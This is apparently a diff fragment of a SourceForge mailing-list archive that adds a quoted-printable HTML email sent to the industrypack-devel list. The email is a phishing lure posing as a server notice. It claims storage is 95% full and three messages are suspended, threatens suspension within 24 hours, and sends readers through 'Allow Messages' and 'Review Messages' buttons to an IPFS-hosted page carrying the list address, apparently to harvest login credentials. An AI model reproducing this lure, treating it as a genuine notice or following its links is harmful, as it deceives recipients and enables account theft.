+se; TEXT-TRANSFORM: none; FONT-WEIGHT: 600; COLOR: #212121; PADDING-BOTTOM:=
+ 0px; FONT-STYLE: normal; PADDING-TOP: 0px; BORDER-SPACING: 0px; ORPHANS: 2=
+; WIDOWS: 2; LETTER-SPACING: normal; font-variant-ligatures: normal; font-v=
+ariant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickn=
+ess: initial; text-decoration-style: initial;=20
+text-decoration-color: initial" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: 'Segoe U=
+I', Frutiger, Arial, sans-serif; WIDTH: 181px; VERTICAL-ALIGN: middle; PADD=
+ING-BOTTOM: 0px; PADDING-TOP: 0px; MARGIN: 0px">10/12/2025 3:39:54 p.m.</TD=
+>
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: 'Segoe U=
+I', Frutiger, Arial, sans-serif; WIDTH: 151px; VERTICAL-ALIGN: middle; FONT=
+-WEIGHT: 400; PADDING-BOTTOM: 0px; TEXT-ALIGN: center; PADDING-TOP: 0px; MA=
+RGIN: 0px">&nbsp;</TD>
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: 'Segoe U=
+I', Frutiger, Arial, sans-serif; WIDTH: 215px; VERTICAL-ALIGN: middle; FONT=
+-WEIGHT: 400; PADDING-BOTTOM: 0px; TEXT-ALIGN: right; PADDING-TOP: 0px; MAR=
+GIN: 0px"><SPAN style=3D"BOX-SIZING: border-box; FONT-FAMILY: 'Segoe UI', F=
+rutiger, Arial, sans-serif, serif, EmojiFont; VERTICAL-ALIGN: baseline; COL=
+OR: white; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN=
+: 0px; PADDING-RIGHT: 0px">
+<SPAN style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: baseline; PADDING-BO=
+TTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT:=
+ 0px"><SPAN style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: baseline; COLO=
+R: #c00000; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGI=
+N: 0px; PADDING-RIGHT: 0px"><SPAN style=3D"BOX-SIZING: border-box; FONT-WEI=
+GHT: bolder">Storage Full: 95%</SPAN></SPAN></SPAN></SPAN></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-FAMILY: Roboto, RobotoDraft, Helv=
+etica, Arial, sans-serif; WIDTH: 548px; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
+px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" colSpan=3D3>
+<TABLE style=3D"WIDTH: 546px; BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0p=
+x; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-SPACING: 0px; PADDING-RIGHT:=
+ 0px" cellSpacing=3D0 cellPadding=3D0 border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 6px; HEIGHT: 10px; WIDTH: 1=
+0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px;=
+ LINE-HEIGHT: 10px; PADDING-RIGHT: 0px" bgColor=3D#cccccc>&nbsp;</TD>
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 6px; HEIGHT: 10px; WIDTH: 1=
+0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px;=
+ LINE-HEIGHT: 10px; PADDING-RIGHT: 0px" bgColor=3Dwhite>&nbsp;</TD>
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 6px; HEIGHT: 10px; WIDTH: 1=
+0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px;=
+ LINE-HEIGHT: 10px; PADDING-RIGHT: 0px" bgColor=3D#cccccc>&nbsp;</TD>
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 6px; HEIGHT: 10px; WIDTH: 1=
+0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px;=
+ LINE-HEIGHT: 10px; PADDING-RIGHT: 0px" bgColor=3Dwhite>&nbsp;</TD>
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 6px; HEIGHT: 10px; WIDTH: 5=
+17px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px=
+; LINE-HEIGHT: 10px; PADDING-RIGHT: 0px" bgColor=3D#c00000>&nbsp;</TD></TR>=
+</TBODY></TABLE></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: 'Segoe U=
+I', Frutiger, Arial, sans-serif; WIDTH: 181px; FONT-WEIGHT: 400; PADDING-BO=
+TTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 2=
+0px; PADDING-RIGHT: 0px">&nbsp;</TD>
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: 'Segoe U=
+I', Frutiger, Arial, sans-serif; WIDTH: 151px; FONT-WEIGHT: 400; PADDING-BO=
+TTOM: 0px; TEXT-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN:=
+ 0px; LINE-HEIGHT: 20px; PADDING-RIGHT: 0px">&nbsp;</TD>
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto, =
+RobotoDraft, Helvetica, Arial, sans-serif; WIDTH: 215px; PADDING-BOTTOM: 0p=
+x; TEXT-ALIGN: right; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LIN=
+E-HEIGHT: 20px; PADDING-RIGHT: 0px"><SPAN style=3D"BOX-SIZING: border-box; =
+FONT-FAMILY: Segoe UI, Frutiger, Arial, sans-serif, serif, EmojiFont">indus=
+trypack-devel@lists.sourceforge.net&nbsp;&nbsp;</SPAN></TD></TR></TBODY></T=
+ABLE>
+<TABLE style=3D"FONT-SIZE: 15px; FONT-FAMILY: Verdana; WIDTH: 528px; WHITE-=
+SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM=
+: none; FONT-WEIGHT: 400; COLOR: #212121; PADDING-BOTTOM: 0px; FONT-STYLE: =
+normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN-LEFT: 0px; ORPHANS: 2; =
+WIDOWS: 2; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: #f=
+2f5fa; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-t=
+ext-stroke-width: 0px; text-decoration-thickness:=20
+initial; text-decoration-style: initial; text-decoration-color: initial" bo=
+rder=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 21px; FONT-FAMILY: 'Segoe U=
+I', Frutiger, Arial, sans-serif; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PAD=
+DING-LEFT: 10px; MARGIN: 0px; PADDING-RIGHT: 10px">
+<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: 'Segoe UI', Frutiger, Ar=
+ial, sans-serif, serif, EmojiFont"><BR style=3D"BOX-SIZING: border-box">&nb=
+sp;</DIV>
+<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: inherit=
+; VERTICAL-ALIGN: baseline; COLOR: #201f1e; PADDING-BOTTOM: 0px; PADDING-TO=
+P: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
+<TABLE style=3D"WIDTH: 528px; BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0p=
+x; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN-LEFT: 0px; PADDING-RIGHT: 0p=
+x">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 21px; FONT-FAMILY: 'segoe u=
+i', frutiger, arial, sans-serif; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PAD=
+DING-LEFT: 10px; MARGIN: 0px; PADDING-RIGHT: 10px">
+<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: inherit=
+; VERTICAL-ALIGN: baseline; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-=
+LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"><SPAN style=3D"BOX-SIZING: bord=
+er-box; MAX-WIDTH: 2150px; FONT-FAMILY: 'Segoe UI', Frutiger, Arial, sans-s=
+erif, serif, EmojiFont"><SPAN style=3D"BOX-SIZING: border-box; FONT-WEIGHT:=
+ bolder">Message Failure Delivery Notice.</SPAN></SPAN></DIV>
+<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: inherit=
+; VERTICAL-ALIGN: baseline; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-=
+LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"><SPAN style=3D"BOX-SIZING: bord=
+er-box; MAX-WIDTH: 2150px; FONT-FAMILY: 'Segoe UI', Frutiger, Arial, sans-s=
+erif, serif, EmojiFont">ATTENTION: industrypack-devel@lists.sourceforge.net=
+</SPAN></DIV>
+<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: inherit=
+; VERTICAL-ALIGN: baseline; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-=
+LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">&nbsp;</DIV></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; FONT-FAMILY: 'segoe u=
+i', frutiger, arial, sans-serif; PADDING-BOTTOM: 6px; PADDING-TOP: 0px; PAD=
+DING-LEFT: 10px; MARGIN: 0px; PADDING-RIGHT: 10px">
+<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: 'segoe ui', frutiger, ar=
+ial, sans-serif, serif, EmojiFont"><SPAN style=3D"BOX-SIZING: border-box; M=
+AX-WIDTH: 2150px; FONT-FAMILY: 'Segoe UI', Frutiger, Arial, sans-serif, ser=
+if, EmojiFont">You have (3) Suspended incoming messages</SPAN></DIV>
+<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: 'segoe ui', frutiger, ar=
+ial, sans-serif, serif, EmojiFont">&nbsp;</DIV>
+<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: 'segoe ui', frutiger, ar=
+ial, sans-serif, serif, EmojiFont"><SPAN style=3D"BOX-SIZING: border-box; M=
+AX-WIDTH: 2150px; FONT-FAMILY: 'Segoe UI', Frutiger, Arial, sans-serif, ser=
+if, EmojiFont">Please Fix It Below&nbsp;</SPAN></DIV></TD></TR></TBODY></TA=
+BLE></DIV></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; FONT-FAMILY: 'Segoe U=
+I', Frutiger, Arial, sans-serif; PADDING-BOTTOM: 6px; PADDING-TOP: 0px; PAD=
+DING-LEFT: 10px; MARGIN: 0px; PADDING-RIGHT: 10px">
+<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: 'Segoe UI', Frutiger, Ar=
+ial, sans-serif, serif, EmojiFont">&nbsp;</DIV>
+<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: 'Segoe UI', Frutiger, Ar=
+ial, sans-serif, serif, EmojiFont">
+<A style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BACKGROUND: #2675d6; F=
+LOAT: left; COLOR: #ffffff; OUTLINE-WIDTH: 0px; PADDING-BOTTOM: 10px; PADDI=
+NG-TOP: 10px; OUTLINE-STYLE: none; PADDING-LEFT: 10px; MARGIN: 2px; DISPLAY=
+: block; PADDING-RIGHT: 10px; text-decoration-line: none" href=3D"https://i=
+pfs.io/ipfs/bafybeigur5w6ask2qh4kukresbgtkgwifk3hezvj73d552ywfzphubnmle/mai=
+lbox4567897.html#industrypack-devel@lists.sourceforge.net" rel=3D"noopener =
+noreferrer" target=3D_blank>Allow Messages</A>
+ <A style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BACKGROUND: #dbd6d6; =
+FLOAT: left; COLOR: #0c0c0c; OUTLINE-WIDTH: 0px; PADDING-BOTTOM: 10px; PADD=
+ING-TOP: 10px; OUTLINE-STYLE: none; PADDING-LEFT: 10px; MARGIN: 2px; DISPLA=
+Y: block; PADDING-RIGHT: 10px; text-decoration-line: none" href=3D"https://=
+ipfs.io/ipfs/bafybeigur5w6ask2qh4kukresbgtkgwifk3hezvj73d552ywfzphubnmle/ma=
+ilbox4567897.html#industrypack-devel@lists.sourceforge.net" rel=3D"noopener=
+ noreferrer" target=3D_blank>Review Messages</A></DIV>
+<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: 'Segoe UI', Frutiger, Ar=
+ial, sans-serif, serif, EmojiFont">&nbsp;</DIV>
+<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: 'Segoe UI', Frutiger, Ar=
+ial, sans-serif, serif, EmojiFont">&nbsp;</DIV>
+<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: 'Segoe UI', Frutiger, Ar=
+ial, sans-serif, serif, EmojiFont">&nbsp;</DIV>
+<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: 'Segoe UI', Frutiger, Ar=
+ial, sans-serif, serif, EmojiFont">You&nbsp;will&nbsp;be&nbsp;briefly&nbsp;=
+suspended from&nbsp;sending&nbsp;and&nbsp;receiving&nbsp;<WBR style=3D"BOX-=
+SIZING: border-box">messages.&nbsp;</DIV>
+<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: 'Segoe UI', Frutiger, Ar=
+ial, sans-serif, serif, EmojiFont">Under&nbsp;about&nbsp;24hrs if no action=
+ is taken.</DIV>
+<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: 'Segoe UI', Frutiger, Ar=
+ial, sans-serif, serif, EmojiFont">&nbsp;</DIV>
+<P style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px"><SPAN style=3D"BOX-SIZ=
+ING: border-box; COLOR: #7c7887"><SPAN data-teams=3D"true">lists.sourceforg=
+e.net</SPAN>&nbsp;Server<SPAN style=3D"BOX-SIZING: border-box"><SPAN style=
+=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder">&nbsp;</SPAN></SPAN>Notifi=
+cation</SPAN>&nbsp;</P>
+<DIV style=3D"BOX-SIZING: border-box">&nbsp;</DIV></TD></TR></TBODY></TABLE=
+></DIV></DIV></BODY></HTML>
 
 
---===============7913652947358151156==
+--===============4172719325842794229==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
 Content-Disposition: inline
 
 
---===============7913652947358151156==
+--===============4172719325842794229==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -410,4 +302,4 @@ Industrypack-devel mailing list
 Industrypack-devel@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/industrypack-devel
 
---===============7913652947358151156==--
+--===============4172719325842794229==--
